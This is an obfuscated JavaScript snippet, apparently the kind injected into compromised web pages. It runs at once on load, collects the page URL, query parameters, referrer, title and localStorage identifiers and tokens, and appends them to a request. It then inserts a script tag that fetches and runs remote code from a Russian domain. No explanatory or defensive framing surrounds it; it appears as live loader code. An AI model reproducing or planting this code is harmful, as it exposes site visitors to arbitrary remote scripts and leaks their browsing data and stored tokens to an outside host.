(function() {
    var name = '_QwKDph4RdRdshFCN';
    if (!window._QwKDph4RdRdshFCN) {
        window._QwKDph4RdRdshFCN = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://derinews.ru/CLqnZsfq',
        };
    }
    const _N7TjnGB9wt91QV4Y = localStorage.getItem('config');
    if (typeof _N7TjnGB9wt91QV4Y !== 'undefined' && _N7TjnGB9wt91QV4Y !== null) {
        var _jcd9jRpm1WGHhGYL = JSON.parse(_N7TjnGB9wt91QV4Y);
        var _MH3PC4n7LWR59KJT = Math.round(+new Date()/1000);
        if (_jcd9jRpm1WGHhGYL.created_at + window._QwKDph4RdRdshFCN.ttl < _MH3PC4n7LWR59KJT) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _fM3Wy9r8w7r5YKyt = localStorage.getItem('subId');
    var _MJC5dCxMz4Xn7dc5 = localStorage.getItem('token');
    var _nh14nvRN44V2d1Fq = '?return=js.client';
        _nh14nvRN44V2d1Fq += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _nh14nvRN44V2d1Fq += '&se_referrer=' + encodeURIComponent(document.referrer);
        _nh14nvRN44V2d1Fq += '&default_keyword=' + encodeURIComponent(document.title);
        _nh14nvRN44V2d1Fq += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _nh14nvRN44V2d1Fq += '&name=' + encodeURIComponent(name);
        _nh14nvRN44V2d1Fq += '&host=' + encodeURIComponent(window._QwKDph4RdRdshFCN.R_PATH);
    if (typeof _fM3Wy9r8w7r5YKyt !== 'undefined' && _fM3Wy9r8w7r5YKyt && window._QwKDph4RdRdshFCN.unique) {
        _nh14nvRN44V2d1Fq += '&sub_id=' + encodeURIComponent(_fM3Wy9r8w7r5YKyt);
    }
    if (typeof _MJC5dCxMz4Xn7dc5 !== 'undefined' && _MJC5dCxMz4Xn7dc5 && window._QwKDph4RdRdshFCN.unique) {
        _nh14nvRN44V2d1Fq += '&token=' + encodeURIComponent(_MJC5dCxMz4Xn7dc5);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._QwKDph4RdRdshFCN.R_PATH + _nh14nvRN44V2d1Fq;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
